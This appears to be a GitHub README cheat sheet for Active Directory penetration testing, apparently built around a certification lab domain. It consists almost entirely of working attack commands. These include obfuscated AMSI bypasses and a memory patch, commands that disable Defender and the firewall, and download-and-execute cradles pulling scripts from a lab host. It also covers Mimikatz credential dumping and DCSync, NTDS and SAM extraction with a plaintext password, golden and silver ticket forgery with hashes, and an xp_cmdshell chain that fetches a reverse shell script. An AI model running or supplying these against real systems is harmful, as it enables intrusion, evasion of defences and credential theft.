## ![Typing SVG](https://readme-typing-svg.demolab.com?font=Fira+Code&duration=6000&pause=1000&center=FALSO&vCenter=FALSO&repeat=verdadero&random=FALSO&width=435&lines=Metodology)

- Initial Reconnaissance
- Detection and Policy Bypass
- Initial Enumeration & Hunting
- Local Privilege Escalation (if applicable)
- Credential Exfiltration
- Full Enumeration
- Lateral Movement

## ![Typing SVG](https://readme-typing-svg.demolab.com?font=Fira+Code&duration=6000&pause=1000&center=FALSO&vCenter=FALSO&repeat=verdadero&random=FALSO&width=435&lines=Initial+Reconnaissance)

```powershell
whoami
whoami /priv
(Get-WmiObject Win32_ComputerSystem).Domain  
$env:username;$env:computername  
Get-LocalGroupMember -Group "administrators"
```

## ![Typing SVG](https://readme-typing-svg.demolab.com?font=Fira+Code&duration=6000&pause=1000&width=435&lines=Detection+and+Policy+Bypass)

```powershell
#Transcription
Get-ItemProperty -Path "HKLM:\Software\Policies\Microsoft\Windows\PowerShell\Transcription"
#Script Block logging
Get-ItemProperty -Path "HKLM:\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging" 
#AV
Get-MpPreference | Select-Object DisableIOAVProtection, DisableRealtimeMonitoring  
#Firewall
netsh advfirewall show allprofiles
#Constrained Language Mode
$ExecutionContext.SessionState.LanguageMode
```
### Bypass AMSI

```Powershell
S`eT-It`em ( 'V'+'aR' +  'IA' + (('b'+("{1}{0}"-f':1','lE'))+'q2')  + ('uZ'+'x')  ) ( [TYpE](  "{1}{0}"-F'F','rE'  ) )  ;    (    Get-varI`A`BLE  ( ('1Q'+'2U')  +'zX'  )  -VaL  )."A`ss`Embly"."GET`TY`Pe"((  "{6}{3}{1}{4}{2}{0}{5}" -f(('U'+'ti')+'l'),'A',('Am'+'si'),(('.'+'Man')+('ag'+'e')+('me'+'n')+'t.'),('u'+'to'+(("{1}{0}"-f 'io','mat')+'n.')),'s',(('Sys'+'t')+'em')  ) )."g`etf`iElD"(  ( "{0}{2}{1}" -f('a'+('ms'+'i')),'d',('I'+('n'+'itF')+('a'+'ile'))  ),(  "{2}{4}{0}{1}{3}" -f ('S'+('t'+'at')),'i',(('N'+'on')+('Pu'+'bl')+'i'),'c','c,'  ))."sE`T`VaLUE"(  ${n`ULl},${t`RuE} )
```
### Bypass Transcription

```powershell
RunWithRegistryNonAdmin.bat
```

### Bypass Enhanced Script Block Logging

```powershell
iex (iwr http://172.16.100.116/sbloggingbypass.txt -UseBasicParsing)
```

### Bypass ConstrainedLanguage

```Powershell
#AppLockerPolicy
$ExecutionContext.SessionState.LanguageMode
Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections

#Downgrading Powershell
powershell.exe -version 2
powershell.exe -version 2 -c '$ExecutionContext.SessionState.LanguageMode'

#Script
$CurrTemp = $env:temp
$CurrTmp = $env:tmp
$TEMPBypassPath = "C:\windows\temp"
$TMPBypassPath = "C:\windows\temp"
Set-ItemProperty -Path 'hkcu:\Environment' -Name Tmp -Value "$TEMPBypassPath"
Set-ItemProperty -Path 'hkcu:\Environment' -Name Temp -Value "$TMPBypassPath"
Invoke-WmiMethod -Class win32_process -Name create -ArgumentList "Powershell.exe"
sleep 5
Set-ItemProperty -Path 'hkcu:\Environment' -Name Tmp -Value $CurrTmp
Set-ItemProperty -Path 'hkcu:\Environment' -Name Temp -Value $CurrTemp
```

### Bypass Execution Policy 

```powershell
Get-ExecutionPolicy

#Load and execute in memory (OPSEC)
iex ((New-Object Net.WebClient).DownloadString('http://172.16.100.116/PowerView.ps1'))

# Script with disk writing (BAD OPSEC)
powershell -ExecutionPolicy Bypass
powershell.exe -ExecutionPolicy Bypass -File .\script.ps1
powershell.exe -ExecutionPolicy Bypass -Command "& { .\script.ps1 }"
PowerShell.exe -ExecutionPolicy UnRestricted -File .\script.ps1
Get-Content .\script.ps1 | Invoke-Expression
GC .\script.ps1 | iex
iex "Write-Output 'test'"
Powershell -command "Write-Host 'Test'"
```

### Turn off AV (BAD OPSEC)

```powershell
Set-MpPreference -DisableIOAVProtection $true
Set-MpPreference -DisableRealtimeMonitoring $true
--- Verificar
Get-MpPreference | Select-Object DisableIOAVProtection, DisableRealtimeMonitoring
```

### Turn off Firewall (BAD OPSEC)

```powershell
netsh advfirewall set allprofiles state off
--- Verificar
netsh advfirewall show allprofiles
```

## ![Typing SVG](https://readme-typing-svg.demolab.com?font=Fira+Code&duration=6000&pause=1000&width=435&lines=Initial+Enumeration)

```powershell
RunWithRegistryNonAdmin.bat
Import-Module Microsoft.ActiveDirectory.Management.dll
Get-ADUser -Filter * -Properties *| select Samaccountname,Description
Get-ADComputer -Filter * | Select-Object -ExpandProperty DNSHostName
Get-ADGroup -Filter * | Select-Object -ExpandProperty Name 
(Get-ADForest).Domains | %{Get-ADTrust -Filter '(intraForest -ne $True) -and (ForestTransitive -ne $True)' -Server $_}   
Get-ADTrust -Filter '(intraForest -ne $True) -and(ForestTransitive -ne $True)'
```

### User Hunting

```powershell
. C:\AD\Tools\Find-PSRemotingLocalAdminAccess.ps1
Find-PSRemotingLocalAdminAccess
Find-PSRemotingLocalAdminAccess -Domain dollarcorp.moneycorp.local
--
. .\Invoke-SessionHunter.ps1
Invoke-SessionHunter -NoPortScan
--
. .\PowerView.ps1
#Use samaccountname
Find-DomainUserLocation -verbose
Find-DomainUserLocation -userGroupIdentity "RDPUsers"
```

### MSSQL

```powershell
Import-Module C:\AD\Tools\PowerUpSQL-master\PowerupSQL.psd1
Get-SQLInstanceDomain | Get-SQLServerinfo -Verbose
Get-SQLServerLinkCrawl -Instance dcorp-mssql.dollarcorp.moneycorp.local -Verbose
```

## ![Typing SVG](https://readme-typing-svg.demolab.com?font=Fira+Code&duration=6000&pause=1000&width=435&lines=Local+Privilege+Escalation)

```powershell
. C:\AD\Tools\PowerUp.ps1
Invoke-AllChecks
---
Invoke-ServiceAbuse -Name 'SNMPTRAP' -UserName 'dcorp\student116' -Verbose
#Check
net localgroup "Administrators"
---
.\SharpUp.exe audit UnquotedServicePath
.\SharpUp.exe audit ModifiableServices
```

## ![Typing SVG](https://readme-typing-svg.demolab.com?font=Fira+Code&duration=6000&pause=1000&width=435&lines=Credential+Exfiltration)

```Powershell
Invoke-Mimi -Command "sekurlsa::logonpasswords"                     
Invoke-Mimi -Command '"sekurlsa::ekeys"'                            
Invoke-Mimi -Command '"token::elevate" "vault::cred /patch"'        
Invoke-Mimi -Command '"lsadump::lsa /patch"'                       
---DCSYNC
Invoke-Mimi -Command '"lsadump::dcsync /user:dcorp\krbtgt"'
--Entre dominios
Invoke-Mimi -Command '"lsadump::trust"'
---NXC
. .\nxc.exe smb 172.16.4.44 -u ciadmin -p *ContinuousIntrusion123 -x whoami
. .\nxc.exe smb 172.16.4.44 -u ciadmin -p *ContinuousIntrusion123 --ntds
. .\nxc.exe smb 172.16.4.44 -u ciadmin -p *ContinuousIntrusion123 --lsa
. .\nxc.exe smb 172.16.4.44 -u ciadmin -p *ContinuousIntrusion123 --sam
```

## ![Typing SVG](https://readme-typing-svg.demolab.com?font=Fira+Code&duration=6000&pause=1000&width=435&lines=Full+Enumeration)

```Powershell
#ADRecon.ps1
Import-Module ActiveDirectory
Import-Module .\Microsoft.ActiveDirectory.Management.dll
git clone https://github.com/sense-of-security/ADRecon.git
.\ADRecon.ps1
--
#bypassear AMSI .NET
$ZQCUW = @"
using System;
using System.Runtime.InteropServices;
public class ZQCUW {
    [DllImport("kernel32.dll")]
    public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
    
    [DllImport("kernel32.dll")]
    public static extern IntPtr LoadLibrary(string name);
    
    [DllImport("kernel32.dll")]
    public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
}
"@
Add-Type $ZQCUW
$amsiDLL = [ZQCUW]::LoadLibrary("amsi.dll")
$amsiScanBuffer = [ZQCUW]::GetProcAddress($amsiDLL, "AmsiScanBuffer")
$p = 0
$size = [UIntPtr]::new(5)
[ZQCUW]::VirtualProtect($amsiScanBuffer, $size, 0x40, [ref]$p)
$patch = [Byte[]] (0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3)
[System.Runtime.InteropServices.Marshal]::Copy($patch, 0, $amsiScanBuffer, $patch.Length)

. .\SharpHound.ps1
Invoke-BloodHound -CollectionMethod All -Verbose
```


## ![Typing SVG](https://readme-typing-svg.demolab.com?font=Fira+Code&duration=6000&pause=1000&width=435&lines=Lateral+Movement)

```Powershell
---
From a cmd with administrative privileges (reset the ArgSplit.bat variables)
C:\AD\Tools\ArgSplit.bat
asktgt
echo %Pwn%
---
C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args %Pwn%   /user:srvadmin /aes256:145019659e1da3fb150ed94d510eb770276cfbd0cbd834a4ac331f2effe1dbb4 /opsec /createnetonly:C:\Windows\System32\cmd.exe /show /ptt
--
```

### Sessions

```Powershell
winrs -r:dcorp-ci cmd
set username && set computername
---
Enter-PSSession -ComputerName dcorp-ci.dollarcorp.moneycorp.local
$env:username;$env:computername
---
runas /noprofile /user:/"USERNAME" powershell.exe
```

### Golden Ticket


```Powershell
. .\PowerView.ps1
$DomainName = (Get-Domain).Name
$Domainsid = Get-DomainSID
$user = Get-DomainUser -Identity 'Administrator'
$userSID = $user.ObjectSID
$userRID = $userSID.Split('-')[-1]
$group = Get-DomainGroup -Identity 'Domain Admins'
$groupSID = $group.ObjectSID
$groupRID = $groupSID.Split('-')[-1]
Write-Output "/domain:$DomainName /sid:$Domainsid /id:$userRID /groups:$groupRID"
--

. .\Invoke-Mimi.ps1
Invoke-Mimi -Command '"kerberos::golden /User:Administrator /domain:dollarcorp.moneycorp.local /sid: S-1-5-21-719815819-3726368948-3917688648 /aes256:154cb6624b1d859f7080a6615adc488f09f92843879b3d914cbcb5a8c3cda848 /id:500 /groups:512 /startoffset:0 /endin:600 /renewmax:10080 /ptt"'

#/aes256:154cb6624b1d859f7080a6615adc488f09f92843879b3d914cbcb5a8c3cda848 -> Hash aes256 of user Krbtgt you can get it with Invoke-Mimi -Command '"lsadump::lsa /patch"' or a dcsync Invoke-Mimi -Command '"lsadump::dcsync /user:dcorp\krbtgt"'
```
### Silver Ticket

```Powershell
Invoke-Mimi -Command '"kerberos::golden /user:Administrator /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-719815819-3726368948-3917688648 /target:dcorp-dc.dollarcorp.moneycorp.local /rc4:af0686cc0ca8f04df42210c9ac980760 /service:CIFS /startoffset:0 /endin:600 /renewmax:10080 /ptt"'
````
### MSSQL

```Powershell
Get-SQLServerLinkCrawl -Instance dcorp-mssql.dollarcorp.moneycorp.local -Query "exec master..xp_cmdshell 'set username'"
Get-SQLServerLinkCrawl -Instance dcorp-mssql -Query 'exec master..xp_cmdshell ''powershell -c "iex (iwr -UseBasicParsing http://172.16.100.116/sbloggingbypass.txt);iex (iwr -UseBasicParsing http://172.16.100.116/amsibypass.txt);iex (iwr -UseBasicParsing http://172.16.100.116/Invoke-PowerShellTcpEx.ps1)"''' -QueryTarget eu-sql15
````

## ![Typing SVG](https://readme-typing-svg.demolab.com?font=Fira+Code&duration=6000&pause=1000&width=435&lines=Tools)

- Microsoft.ActiveDirectory.Management.dll
- BloodHound-4.O.3_old.zip
- Find-PSRemotingLocalAdminAccess.ps1
- hfs.exe
- adPEAS.ps1
- InviShell
- Nmap-7.92
- Invoke-Mimi.ps1
- Invoke-PowerShellTcp.ps1
- Invoke-SessionHunter.ps1
- Invoke-SQLOSCmd.ps1
- SharpUp.exe
- PowerUp.ps1
- PowerUpSQL-master.zip
- PowerView.ps1
- Rubeus.exe
- sbloggingbypass.txt
- SharpHound.exe
- SharpHound.ps1
- nc64.exe
- NetExec.exe
